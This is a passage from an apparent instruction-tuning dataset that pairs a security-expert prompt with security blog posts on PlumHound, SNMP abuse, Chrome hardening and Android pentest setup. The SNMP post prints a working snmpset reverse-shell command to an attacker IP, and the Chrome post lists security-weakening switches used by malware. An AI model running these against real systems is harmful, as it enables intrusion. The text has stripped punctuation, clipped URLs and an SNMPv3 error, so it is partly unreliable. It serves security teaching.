BloodHoundAD has ingested and parsed data PlumHound then uses Neo4j's cypher language to query its database for information and output that information into CSV or HTML reports or alternatively to standard output That is the BloodHoundAD analysis can be normalized into a reporting format that can be consumed for data-driven decision making about correcting common Active Directory control path vulnerabilities Running PlumHound Report Engine Running PlumHound is easy specify the Neo4j database connection and specify the task-list you want to do Task-lists are sets of cypher queries and metadata that tell PlumHound what query to run and how to generate a report from the output The Default task-list included with PlumHound includes 69 reports plus an index To shorthand things even further if your Neo4j server is on localhost you won't need to specify a Neo4j connection For versions of Neo4j that still use default credentials you must first update the default credentials to use the service If you're like me you source-filter the Neo4j service and update credentials to be something easy lazy terrible Anyway I change the password from neo4j to neo4jj because source-filter the service Remember if you source-filtered the service you will need to run PlumHound from that trusted source If your username is neo4j and your updated password is neo4jj you won't need to specify your username and password to connect to the Neo4j database because the default is neo4jj It's as simple as That will execute the default included task-list PlumHound.py -x tasks default.tasks That's it 69 PlumHound reports a report index are ready for your review nice Task Files The TaskList files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j The TaskList file syntax is as follows Note that any cypher query containing a double quote must be modified to use a single quote instead of double Report Title Output-Format Output-File CypherQuery What reports are packaged in the default list The default.tasks instructs PlumHound to also generate an index of all the produced reports index.html Opening the index.html file shows us the list of reports The reports start out pretty typical and provide a general report-based picture of the Active Directory environment Then our first interesting set of reports Our test database we used isn't super interesting but each of the reports below provide information that as penetration testers we use to find a foothold or escalate privileges on the network Of course as a Blue Teamer we'd recommend thinking critically about each of the items in these reports Next up reports that tell us if common or overly-used groups have been potentially mistakenly provided Active Directory delegation In the group below PasswordResetter groups let us know that a group has been delegated to reset passwords and will count how many users are delegated to the group Next up reports regarding the domain's GPOs and analysis of the GPO owners Then RDP groups that tell us if RDP access is provisioned via groups and which groups provide access to a count of systems Then reports of Kerberoastable users with the most privileges and an analysis of Local Administrators And onto reports about Computer Objects Operating Systems and LAPS Deployments After computers we look at user accounts We report all identified user sessions and users with multiple sessions on different systems We then look at user accounts with old passwords We look at users with vulnerable userpassword attributes and users with no Kerberos pre-authentication needed We also have reports of users with administrative control of a system both directly and indirectly Users with Add To Group Delegation tell us which users have been delegated to change group membership both directly and indirectly We report on users that have never logged in and finally users that are never required to change their passwords Finally we have reports that are populated by the user of BloodHoundAD's Owned flags allowing an analyst to produce detailed reports of post-exploitation defining exactly which user and computer accounts were compromised during an engagement Cyphers Included Each of the produced reports includes the cypher query used to generate the report While useful for troubleshooting and developing the reports it also allows the analyst the ability to utilize the cypher query as an ingest to other tooling In the below report GPO Creators Owners we see that ASADMIN ASAZLAB.com is a GPO Creator Owner Included in the report are the date and time the report was executed as well as the cypher query used to generate the report How do analysts use these reports A penetration tester can find quick information for example what user accounts don't require a password change but have also ever been an admin The User Password Never Expires Exception report will tell us just that by checking the AdminCount column A defensive or Blue Team analyst can also use the same reports but with the objective of identifying vulnerable configurations to be remedied Single Queries PlumHound's interface with Neo4j also means that you can quickly and easily execute cypher queries and output directly to the console In the below example we query for users that never require a password change PlumHound.py -q MATCH n User WHERE n.pwdneverexpires RETURN n.name as Name n.displayname as DisplayName n.enabled as Enabled n.title as Title n.pwdneverexpires as PWDNeverExpires n.passwordnotreqd as PWDNotReqd n.admincount as AdminCount Even more task-lists PlumHound also includes other task-lists that are more specific to looking for specific data For example we've bundled Kerberoasting specific reports into its own task-list We've produced a task-list to generate CSV reports instead of HTML We also have a task-list that will hunt for interesting things such as passwords in description or comment attributes of Active Directory objects Analyze Path BlueHound Module The Analyze path function allows us to identify what relationship to break to stop a control path vulnerability The command syntax is simple use flag -ap and specify either user group computer ou or GPO as a start to the path analysis PlumHound.py -ap user In the below screenshot user DataAnalyst asazlab.com has a path to OU AdminAccounts The output below details the path For those more familiar with BloodHound's GUI this is the same representation as below but indicating the specific relationships to break The AnalyzePath query will effectively produce a kill-chain for every vulnerable path by user group computer OU or group Busiest Path BlueHound Module The Busiest Path finds the shortest or all paths that give the most users a path to Domain Admin and gives us number of affected users The most busiest path is listed first This informs a team tasked with remediating path vulnerabilities information about which paths to start remediating first to most effectively use their time and effort In the case below we search for the top 5 most user-affected shortest paths to Domain Admin PlumHound.py -bp short 5 The first path described below affects six users and is a path starting from group USR_Helpdesk asazlab.com to Domain Admins We can see the path in BloodHoundAD by using the control-paths search Verbosity As a Feature This tool was made by someone who doesn't write code for a living or at least not full-time As a clutch for not writing in a debug IDE I've written in a function that causes the PlumHound tool to have a very configurable debug verbosity This helps the process of testing cypher queries and writing task lists The verbosity argument for PlumHound is -v number The verbose number can be 0-1000 where 0 is quiet and 1000 produces a message on every crucial step of the PlumHound process somewhere in between is just that Too verbose Reduce your -v setting Not enough Increase it In addition to this verbose logging is also configured to review prior logs generated by the tool Check out PlumHound for Yourself We invite you to checkout the PlumHound report engine We've built it open-source to help administrators and analysts make the most of BloodHoundAD's control path analysis If you find a useful cypher query you want added let us know or make a pull request GitHub Link PlumHound github.com Documentation PlumHound Bloodhound for Blue and Purple Teams Interested in knowing more about securing Active Directory and Enterprise environments Check out our class presented by AntiSyphon Security Defending the Enterprise"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>SNMP Strings Attached!</title>\n<taxonomies>Author, Dale Hobbs, External/Internal, How-To, Informational, InfoSec 201, Recon, Community Strings, Default, SNMP</taxonomies>\n<creation_date>Wed, 21 Dec 2022 15:08:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dale Hobbs One thing that I almost always find when performing an internal network penetration test is Simple Network Management Protocol SNMP configured with default community strings Simple Network Management Protocol SNMP is a widely-used protocol for managing and monitoring network devices such as routers switches and servers It allows network administrators to manage and monitor the performance of network devices and to troubleshoot issues when they arise SNMP is based on a manager-agent model where a central network management system NMS acts as the manager and communicates with SNMP agents on each network device The NMS sends requests to the agents for information about the device and the agents respond with the requested data This allows the NMS to collect and analyze data from all the devices on the network SNMP depends on secure strings or community strings that grant access to portions of a device's management planes There are two common community strings that we often see 'public which mainly provides read-only access and 'private which generally provides read-write access A device that uses default SNMP community strings can have its entire configuration read using SNMP queries In addition when a device is configured with SNMP write access using a default string such as 'public it is trivial for an attacker to modify the device's configuration There are 3 versions of SNMP SNMPv1 This is the oldest version whereby the authentication is based on a community string that is transmitted without the benefit of encryption and as such all the information is transmitted in plain text as well It's easy to set up but is only protected by the plain text community string SNMPv2c Version 2c is nearly identical to Version 1 except it adds support for 64-bit counters This is by far the most frequently used version today but like Version 1 also sends the traffic in plain text as well uses a plain text community string as authentication Even if you have a non-default community string gaining a Machine in the Middle position will result in disclosure of the community string through simple packet analysis SNMPv3 Version 3 is the latest version of SNMP and adds both encryption and authentication which can either be used together or separately It's more complex to set up than Version 1 or Version 2c but is a much more secure choice Let's look at what types of information we can gather from a device Nmap has a handful of useful NSE scripts specifically for SNMP For example using the 'snmp-sysdescr NSE script we can retrieve the server type and operating system Using the 'snmp-interfaces NSE script we can gather some network information about the device such as IP addresses any additional network interfaces and even traffic statistics While these are all useful for a network administrator they're also useful for an attacker as they can start to build a profile about the system and attempt to formulate an attack While this is by no means an exhaustive list of what you can do with SNMP it should at least give you an idea of what we can gather using SNMP If you'd like to see more SNMP scripts you can consult map.org So now that we've seen a couple things you can do with SNMP from a blue team perspective let's see what we can do as an attacker using SNMP when configured with default community strings For the purposes of this article we're going to be attacking a Linux-based system configured with SNMP in hopes of gaining a remote shell First off by doing a simple Nmap UDP scan of the system we can see that SNMP is indeed running on the system and is using the default UDP port 161 Now that we have confirmed that the system is running SNMP we can use Metasploit's 'scanner snmp snmp_login module to see if the system is utilizing the default community strings As can be seen from the output above the system is in fact using both the 'public read-only and 'private read-write community strings Because we have read-write access using the 'private string we are now able to add or execute additional commands on the system over SNMP by appending additional rows to the 'nsExtendObjects table The 'nsExtendObjects is part of the NET-SNMP-EXTEND-MIB extension for the Net-SNMP agent that allows you to query arbitrary shell scripts A deep dive on this is outside of the scope of this article but if you'd like to learn more about it you can find a detailed article here Using the following command we can inject a command into the SNMP configuration that will create a reverse shell back to our attacker system snmpset -m NET-SNMP-EXTEND-MIB -v 2c -c private 192.168.19.128 'nsExtendStatus evil createAndGo 'nsExtendCommand evil usr bin python 'nsExtendArgs evil '-c import sys socket os pty s socket.socket s.connect 192.168.19.50 1234 os.dup2 s.fileno fd for fd in 0 1 2 pty.spawn bin sh Next we launch a Netcat listener on our attacker system With our Netcat listener waiting we now use snmpwalk to trigger the command execution on the victim and initiate a connection to the Netcat listener on our attacker system We can safely ignore the timeout message as we can now see in our Netcat listener that we have a new connection from our victim system And to add insult to injury not only do we have a remote shell to our victim system we can see that we also have root access to the system This type of attack can be extended to network infrastructure devices like routers switches and other appliances Imagine the implications of an attacker modifying access control lists altering VLAN configurations or simply disabling ports on a network infrastructure device Read-write access can be used to bypass security controls move laterally on the network or cause denial of service events Now that we've seen how SNMP can be abused let's look at some best practices for securing SNMP First and foremost if you're not explicitly using SNMP then you should disable it wherever possible If you are intentionally using it then make sure you change the default community strings and use something other than 'public and 'private Using something unique and difficult to guess will make it harder for an attacker to gain access to SNMP on your network Additionally you can block access to ports 161 and 162 at either a firewall or an Access Control List ACL This will allow your authorized systems to still access your SNMP enable devices while preventing an attacker from gaining access to SNMP Unless of course they have compromised one of your authorized systems in which case you likely have bigger issues to worry about than SNMP but that's a topic for another day Finally instead of using SNMPv1 or SNMPv2c consider using SNMPv3 with the AuthNoPriv mode to encrypt authentication credentials and configure it to use MD5 and SHA for extra security In conclusion SNMP is a valuable tool for network administrators but it can also be abused by attackers By taking the necessary security measures and monitoring the network organizations can protect themselves against SNMP abuse and ensure the integrity and availability of their networks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Talkin' About Infosec News - 12/21/2022</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Wed, 21 Dec 2022 18:29:44 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be aUJnS3Wh4OQ 00 00 PreShow Banter Talkin Bout Elon News00 51 BHIS Talkin Bout infosec News 2022-12-1902 46 Story 1 Antivirus and EDR solutions tricked into acting as data wipersww.bleepingcomputer.com news security antivirus-and-edr-solutions-tricked-into-acting-as-data-wipers 12 11 Story 2 Twitter suspends ElonJet after Musk promises not to ban itww.theverge.com 2022 12 14 23508898 elonjet-twitter-ban-elon-musk-jet-tracker12 48 Story 2b Elon Musk starts banning critical journalists from Twitterww.theverge.com 2022 12 15 23512004 elon-musk-starts-banning-critical-journalists-from-twitter14 37 Story 2c Twitter abruptly bans all links to Instagram Mastodon and other competitorsww.theverge.com 2022 12 18 23515221 twitter-bans-links-instagram-mastodon-competitors15 08 Story 2d Elon Musk should step down as head of Twitter says pollww.theverge.com 2022 12 18 23515764 elon-musk-head-twit-poll-tesla-doxxing-moderation16 18 Story 2e Your Car is Trackable by Lawedium.com doctoreww day-2-your-car-is-trackable-by-law-1d5f7438885022 41 Story 2f AirNav RadarBox FlightStick ADS-B USB Receiver with Integrated Filter Amplifier and ESD Protectionww.amazon.com AirNav-RadarBox-FlightStick-Advanced-Receiver dp B07K47P7XD 26 41 Story 3 FBI's Vetted Info-Sharing Network 'InfraGard Hackedrebsonsecurity.com 2022 12 fbis-vetted-info-sharing-network-infragard-hacked 32 24 Story 4 Reno mayor sues after finding tracking device on vehiclepnews.com article lawsuits-reno-34940c636465c050f2e0ebd2d9d119af36 43 Story 5 Email hijackers scam food out of businesses not just moneyww.theregister.com 2022 12 17 in_brief_security 42 46 Story 6 Bugs in LEGO Resale Site Allowed Hackers to Hijack Accountsww.pcmag.com news bugs-in-lego-resale-site-allowed-hackers-to-hijack-accounts45 41 Story 7 CISA Alert Veeam Backup and Replication Vulnerabilities Being Exploited in Attacksww.cyberscoop.com apt28-fancy-bear-satellite 50 05 Story 8 CISA researchers Russia's Fancy Bear infiltrated US satellite networkhehackernews.com 2022 12 cisa-alert-veeam-backup-and-replication.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title><strong>Forward into 2023: Browser and O/S Security Features</strong></title>\n<taxonomies>General InfoSec Tips & Tricks, Informational, Joff Thyer, Red Team, Web App</taxonomies>\n<creation_date>Wed, 18 Jan 2023 16:38:12 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Introduction We have already arrived at the end of 2022 wow that was fast As with any industry or aspect of life we find ourselves peering into 2023 and wondering in which direction the information security landscape will evolve As I contemplated this idea today I thought I would write down a few introspective thoughts myself Firstly the traditional security perimeter stack has evolved dramatically We live in a world where the archaic concentric circles model aka the moat around the castle has completely dissolved Anywhere from cloud migration to highly functional apps delivered directly in the browser to end-user enabled shadow IT zero trust security models and so on has resulted in a complete rethinking of boundaries along with a considerable amount of anxiety of behalf of security professionals Just where is our data How well is it protected Are the dev-ops engineers trained well enough to keep security front of mind in an agile delivery world Do all these cloud providers give us the right tools to secure our organization We must all adapt to these challenges through change Holding onto an illusion of control through the castle and moat model is a fool's errand While I could write about the plethora of information security implications that this rapidly evolving model has introduced I wish to focus for now on the commonly used Windows workstation endpoint With the endpoint we have seen a dramatic improvement in the deployed security technologies that protect the operating system itself The endpoint extended detection and response EDR XDR software capabilities have matured significantly making both initial compromise and post exploitation activities on the Windows endpoint extraordinarily challenging assuming mature deployment and tuning While I think we can all agree this is fabulous news for the industry we should ask ourselves whether maximizing desktop O S protections still matters as much as it used to Otherwise said we must concede that the web browser is where critical business data is increasingly being managed The natural corollary question is whether sufficient security technologies are deployed in the browser Do these protections rival the O S deployed protections Are these protections integrated with the O S level defensive deployments Google Chrome and Chromium Project Let's start with the web browser market share1 Google Chrome clearly leads the pack in adoption There are additionally browsers based on Google's Chromium project such as Opera and Microsoft Edge which notably holds second place to Chrome From this data we can conclude that any security vulnerabilities in the Chromium open-source project will be very significant and that proprietary security-related code in the Chrome and Edge browsers is also critically important Web Browser Market Share Given this backdrop what security features are implemented in Chrome and Chromium that help defend the browser and its user2 The team at Google have created a security architecture3 diagram which does a pretty good job of identifying the attack surfaces from a process level perspective below4 The major target areas of concern are the browser process and the renderer processes Chrome Security Architecture from Process Perspective Given the browser architecture landscape and process level concerns above let's break down some of the protective technologies that have been authored in response to browser security concerns Please note that much of the below information has been researched and somewhat paraphrased from Google blogs and design documents available online There are several key architectural foundations and features in the Chrome Chromium browser effort that are relevant The Renderer Sandbox Site Isolation Spectre Mitigation The V8 JavaScript Sandbox Heap Exploit Mitigations Improving Memory Safety User facing security controls Renderer Sandbox The Chromium project renderer sandbox5 adheres to sound foundational security principles As earlier stated I will keep this discussion in the context of the Windows desktop These principles include Not reinventing the wheel Let the operating system apply its security to the objects it controls Principle of least privilege applied both to the sandboxed code and the code that runs the sandbox itself Always assume the sandboxed code is malicious Minimize performance impact No use of emulation code translation or patching to provide security The Windows architecture is a user mode implementation There are no supporting kernel drivers to date The sandbox architecture breaks down into two processes a broker process and a target process The broker is the supervisor of the target processes doing the actual work Broker Process Broker process responsibilities are to Specify a policy for each target process Sandbox target interceptions are evaluated against this policy when received see below Spawn the target processes Host the sandbox policy engine and interception manager Host the sandbox IPC service for target processes Perform policy-allowed actions on behalf of target processes Target Process The target processes are the actual renderers themselves Responsibilities include Host the code to be sandboxed Run the sandbox IPC client for messaging Be the sandbox policy engine client Perform sandbox interceptions Note that interceptions are how Windows API calls are forwarded via the sandbox IPC to the broker Sandbox Process Architecture The Sandbox Restrictions The renderer sandbox depends on the protections provided by the Windows operating system which include the use of A highly restricted security token which implements group restrictions has no specific privileges and uses the Untrusted integrity level The Untrusted integrity level can only write to resources which have a null DACL or an explicit Mandatory Integrity Control MIC level of Untrusted A Windows job object for target processes which implements numerous restrictions including Prohibits per-use system wide changes Prohibits creating or switching Windows desktops Prohibits changes to display settings Prohibits clipboard access Prohibits Windows message broadcasts Prohibits setting global hooks via the SetWindowsHookEx API call Prohibits access to the atom table Prohibits access to user handles outside of the job object Limits to one active process no child process creation allowed The Windows desktop object The sandbox creates an additional desktop that is associated to all target processes This desktop is never visible or interactive and effectively isolates the sandboxed processes from snooping the user's interaction and from sending messages to windows that are operating at more privileged contexts Site Isolation Site isolation was an effort to completely re-architecture the browser security model to align it more closely with operating system process security boundaries6 7 The site isolation project was a response to both act as a second line of defense for successful attacks against the rendering engine and to mitigate CPU speculative execution memory leakage attacks Spectre8 For transient execution attacks mitigation strategies were considered including The removal of precise timers which was harmful to the operational aspect of the platform Implementation of compiler runtime scanning mitigations which were deemed impractical Keeping data isolated out of reach which is ultimately what site isolation achieves The Site concept is not as granular as the Origin concept An Origin consists of the protocol scheme the host name and port A Site on the other hand is defined by the effective top-level domain eTLD plus the domain portion just before it also known as eTLD 1 Note since there is no algorithmic method for determining the domain suffixes in an eTLD a public suffix list is now maintained ithub.com publicsuffix list Origin Example Site Example 1 Site Example 2 The V8 JavaScript WASM Sandbox Since mid-2020 Google's open-source JavaScript Web Assembly engine V8 has implemented a pointer compression for heap management9 This means that every reference from an object in the V8 heap to another object in the V8 heap becomes a 32-bit offset from the base of the heap Compressed pointers are thus valid only within a 4GB memory range which is called a pointer compression cage The majority of vulnerabilities which can be exploited to corrupt memory will thus only be able to corrupt within this compression cage There exist a few objects with raw absolute pointers to objects outside of the heap off-heap An attacker can target these few objects typically an Array Buffer or typed Array backing store pointer to corrupt memory outside of the heap which is of course sub-optimal and can result in code execution The V8 Sandbox project objective is to protect these remaining few objects in a way that also prevents attacker abuse In summary this design achieves the goal as follows A large 1TB region of memory the sandbox is reserved during initialization This region of memory contains the pointer compression cage as well as storage for the array backing stores and other objects All objects inside this sandbox but outside of V8 heaps are addressed using 40-bit fixed size offsets instead of raw pointers Any remaining off-heap objects must be referenced through an external pointer table which contains the actual pointer and object type information to additionally help defend against type-confusion style attacks Improving Memory Safety During 2020 the Chromium project studied and published that over 70 of their high severity security defects were memory-safety related with over half of these being of the use after free variety Quite specifically this translates into mistakes with pointers in the C C languages which cause memory to be misinterpreted It almost goes without saying that this one issue is a plague that has affected the software industry in general for decades Chrome has been exploring avenues to address this including Making C C safer via compile time checks on pointer correctness Making C C safer through runtime checks on pointer correctness Investigating the use of a memory safe language for parts of the Chromium codebase In terms of C C safety the project has explored the use of Miracle Pointers 10 which is really just a term for a class of algorithms that wrap pointer use in templated memory safe C C classes The object of these implementations is to eliminate the largest use after free type of vulnerabilities In terms of a memory safe language implementation the team has been exploring Rust as a potential alternative for parts of the codebase User-Facing Security Controls Chrome ships with a number of user facing security features that can help mitigate the risk of an initial browser exploitation attempt These include Safe Browsing a block list that warns you about potentially malicious sites Predictive Phishing Protection scans pages to see if they match known fake or malicious sites Incognito Mode also known as private browsing mode All browsing history and cookies will be deleted at the end of an incognito mode session The browser will also not remember any information entered into forms or permissions granted to websites Safety Check a user driven security checkup audit on the browser Safety check runs through a series of basic checks for you such as Is the Chrome software fully up to date Have any of your saved passwords been compromised in public breaches Is the Safe Browsing feature enabled Do you have any harmful extensions enabled Is there any known harmful software that you have downloaded Automatic Updates Chrome will notify if a software update is available Chrome Extensions Chrome extensions are used to add additional features and functionality to the browser11 Extensions are authored with the same technologies that websites use these being HTML for content markup CSS for content styling JavaScript for scripting logic There is an additional emerging technology that extensions can leverage called WebAssembly Wasm WebAssembly is a binary instruction format for a stack-based virtual machine that can be executed in the same context of the JavaScript engine in the browser Google's V8 implementation is in fact both a WebAssembly and JavaScript engine WebAssembly aims to operate at near native performance levels by taking advantage of hardware capabilities of the target platform Because it is a binary instruction format different high-level languages can be compiled to WebAssembly assuming a relevant compiler has been authored Extensions can use all the JavaScript APIs that the browser provides as well as gain access to Chrome APIs This additional level of access to the Chrome APIs allows things like Changing the functionality or behavior of a website Collecting information across different websites Adding features to Chrome development tools Extensions can be broken down into two components a content presentation component and a service worker component The service worker operates as a background task of sorts and can interact with the presentation component through messaging or browser local storage A service worker is event driven and can use all the Chrome APIs but cannot interact directly with web content Chrome extensions are officially published in the Chrome web store When installed they allow the developer to request via the MANIFEST a great deal of power and control over your web browser Things to consider about extensions are A Chrome extension can read and modify web page content A Chrome extension can access cookies browser history and browser data storage A Chrome extension can transmit and receive any data across the network A Chrome extension can exert control over other Chrome extensions Chrome extensions in the web store are not guaranteed to be malware free When you install an extension you are extending a lot of trust to the developer of that extension Chrome Command Line Switches We are probably all used to just clicking on the Chrome icon and assuming that Chrome will start up normally trusting that all is in order as it should Having said this there are several command line switches12 that can be used to change the behavior of Chrome upon startup Some of these switches specifically disable or weaken security features of the browser usually for testing development purposes I have identified the following list of switches which I have either already used experimentally read about in malware reports or which I suspect may present a security concern It is not uncommon for malware to kill the Chrome process and then restart Chrome adding in some command line switches to change the behavior of the browser such as loading a malicious extension for example --allow-legacy-extension-manifests allows the browser to load extensions that lack a modern manifest and would otherwise be forbidden --allow-no-sandbox-job allows the sandboxed processes to run without a Windows job object assigned to them This has the effect of broadening access to available Windows APIs that would not normally be available --allow-unsecure-dlls Won't allow EnableSecureDllLoading to run when this is set Probably allows you to load any unsigned DLL --disable-breakpad Disables crash reporting --disable-crash-reporter Disables crash reporting in headless mode --disable-extensions-http-throttling Disables the net URLRequestThrottleManager functionality for HTTP s requests originating from extensions --disable-web-security Does not enforce same site origin policy --hide-crash-restore-bubble Disables showing the browser crash restore bubble --load-extension Loads an extension from disk on startup --load-empty-dll Loads the file empty-dll.dll whenever this flag is set --proxy-server Uses the specified proxy server overriding the system proxy settings --no-sandbox Disables the renderer sandbox completely --restore-last-session Restores last browsing session after crash exit --single-process Runs the renderer and plugins in the same process as the browser The ChromeLoader13 14 malware is an example of using PowerShell to kill the Chrome process and then restart loading the extension that has been dropped Concluding Thoughts It is very clear that Google has taken the attacks on the renderer and JavaScript engine as well as the threat posed by speculative execution memory leakage very seriously As such they have implemented a robust defensive architecture that is a best effort to mitigate the risks posed Having said this the Chrome browser endpoint is a very complex software architecture Having a dynamic compilation environment Just-In-Time Compiler in the areas of JavaScript and now WebAssembly will always suffer the potential of a logic flaw in which an attacker can force the compiler assembler engines to emit malicious code Continued work on heap protections in the V8 JavaScript WebAssembly space acts as a line of defense here It is likely that memory use-after-free defects will continue to be found unless the entire architecture is re-written in a memory safe language which would frankly be a mammoth effort I applaud the efforts to work around the edges chipping away at the problem by proposing rewriting to a memory safe language for exposed components where it makes most sense I also think we are likely to see more interest from the Chrome Chromium team in the areas of Control Flow Guard15 and Control-flow Enforcement Technologies16 which further aligns the browser not only with the Windows operating system security defenses but also with CPU hardware Lastly as with much of the past decade in information security you cannot predict what an end user will do If the end user downloads malware that in turn drops a malicious extension and script to silently restart the browser the power granted by the extension over the browser exposes a significant attack surface I question whether there is a legitimate operational use case for many of these command line switches to exist in the release version of Chrome and would suggest perhaps that the release version eliminate much of this capability to further reduce the attack surface Happy New Year and Happy Safer Browsing in 2023 References 1 s.statcounter.com browser-market-share 2 ecurity.googleblog.com 2022 03 3 eclab.stanford.edu websec chromium chromium-security-architecture.pdf 4 ww.chromium.org Home chromium-security guts 5 hromium.googlesource.com chromium src master docs design sandbox.md 6 ww.usenix.org conference usenixsecurity19 presentation reis 7 ww.chromium.org developers design-documents site-isolation 8 pectreattack.com spectre.pdf 9 ocs.google.com document d 1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8 edit 10 hromium.googlesource.com chromium src ddc017f9569973a731a574be4199d8400616f5a5 base memory raw_ptr.md 11 eveloper.chrome.com docs extensions 12 eter.sh experiments chromium-command-line-switches 13 nit42.paloaltonetworks.com chromeloader-malware 14 logs.vmware.com security 2022 09 the-evolution-of-the-chromeloader-malware.html 15 earn.microsoft.com en-us windows win32 secbp control-flow-guard 16 ww.intel.com content www us en developer articles technical technical-look-control-flow-enforcement-technology.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Start to Finish: Configuring an Android Phone for Pentesting</title>\n<taxonomies>How-To, Mobile, Android, android hacking, mobile hacking, penetration testing, Pentesting, walkthrough</taxonomies>\n<creation_date>Wed, 25 Jan 2023 15:26:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jeff Barbi Guest Post Background Unless you're pentesting mobile apps consistently it's easy for your methodologies to fall out of date Each new version of Android brings with it additional security features to bypass making the process you used three years ago to set up your testing device obsolete If you're like me instead of documenting how you set up your last phone you re-discover a new process each time you configure one This is redundant and silly Worse the information is scattered across the internet in code repos blogs and forum threads Worse still much of this info is outdated and no longer works What follows is an attempt to save others time in the future by documenting a known-good process for Android 12 at the time of writing October 2022 I took a factory non-rooted Pixel 4A running a recent stable version of Android 12 snow cone and documented the steps required to configure it for pentesting start to finish This includes defeating certificate pinning which is becoming more and more common At the start of each section I include the tools required and where to get them The order of operations we'll take is as follows Enable developer mode boot loader unlocking and USB debugging Unlock the boot loader Use Magisk to modify a factory boot image Flash this new image to the bootloader rooting the phone Convert the Burp certificate to a format Android expects Install the Burp cert as a trusted CA using a custom Magisk Module Template installer Install run Frida server on the phone Connect Frida server agent with Runtime Mobile Security frontend Run our target app in a hooked process via RMS Use a custom RMS plugin to bypass cert pinning I'm starting with a factory-original out-of-the-box phone I followed the prompts to join Wi-Fi log into a Google account accept the ToS etc NOTE My host machine for this walkthrough was running a Debian-based Linux distro The steps should work on other distros and or OSX but some of the syntax may be different Rooting the phone Tools required Android Debug Bridge adb apt install adb eveloper.android.com studio releases platform-tools downloads fastboot apt install fastboot eveloper.android.com studio releases platform-tools.html downloads Note Package repos like apt will have older versions of these tools They may work but I used the ones from the developer site Unlocking the boot loader If we want to install the Burp cert Frida defeat certificate pinning etc then we need to root our phone This involves writing a modified boot image to the phone's boot loader To do that we need to unlock it Enable developer mode Go to Settings About phone Tap on Build number 7 times After entering your PIN you will see this You are now a developer message Enable USB debugging OEM unlocking Go to Settings System Advanced and you will see a new item Developer options In the dev options menu toggle on OEM unlocking and you will see a warning Confirm OK and your boot loader is unlocked Toggle on USB debugging you will see another warning Choose OK Test adb Now that USB debugging is enabled we can use adb and fastboot Plug the phone into the computer and confirm adb can connect to the phone adb devices -l List of devices attached 13011JEC204262 device usb 5-1.4 product sunfish model Pixel_4a device sunfish transport_id 2 Then use adb to reboot into fastboot mode adb reboot bootloader The phone will reboot and we can now run fastboot commands on the phone Check that fastboot can connect to the phone fastboot devices 13011JEC204262 fastboot Now we can unlock the bootloader fastboot flashing unlock OKAY 0.104s Finished Total time 0.104s The warning screen will change and Do not lock the bootloader is selected by default Hit the volume up key to select Unlock the bootloader then hit the lock button The phone will reboot back into fastboot mode Hit the lock button and the phone will reboot again The boot loader is now unlocked When the phone boots follow the prompts again to join Wi-Fi log into a Google account etc Enabling USB debugging again Unlocking the boot loader resets the phone disabling developer mode and USB debugging along with it Re-enable these the same way as before Settings About phone Tap on Build number 7 times then enter the PIN Settings System Advanced and enter the Developer options menu Toggle on USB debugging Reboot the phone Hit allow on the warning prompt Installing the Magisk app Download the Magisk app as an APK file here ithub.com topjohnwu Magisk releases latest Then use adb to install the app adb devices -l List of devices attached 13011JEC204262 device usb 5-1.4 product sunfish model Pixel_4a device sunfish transport_id 4 adb install Magisk-v25.2.apk Performing Streamed Install Success Modifying a boot image with Magisk Magisk can modify a factory boot image for us which we'll write to the boot loader and root the phone IMPORTANT modifying boot images is done differently on different phones What follows is for a Pixel 4A and other Google phones using the same partition scheme Specific steps for phones from other vendors are described in detail here ww.xda-developers.com how-to-install-magisk Boot images for Nexus and Pixel devices are available here evelopers.google.com android images Since I'm using a Pixel 4A and Android 12 I downloaded the android 12.1.0 sunfish image evelopers.google.com android images sunfish Here is a direct link to the image l.google.com dl android aosp sunfish-sq3a.220705.003.a1-factory-c1963f71.zip IMPORTANT for the rest of this step it's critical that the image you downloaded matches the version of Android on the phone Patch the image Extract the zip file and then the boot image unzip -p sunfish .zip .zip image.zip unzip -p image.zip boot.img boot.img file boot.img boot.img Android bootimg kernel 0x8000 ramdisk 0x1000000 page size 4096 cmdline console ttyMSM0 115200n8 androidboot.console ttyMSM0 printk.devkmsg on msm_rtb.filter 0x237 ehci-hcd.park 3 service_locator.ena Use adb to push this file to the phone I chose the Download directory because it's easy to find in Magisk adb push boot.img storage self primary Download boot.img 1 file pushed 0 skipped 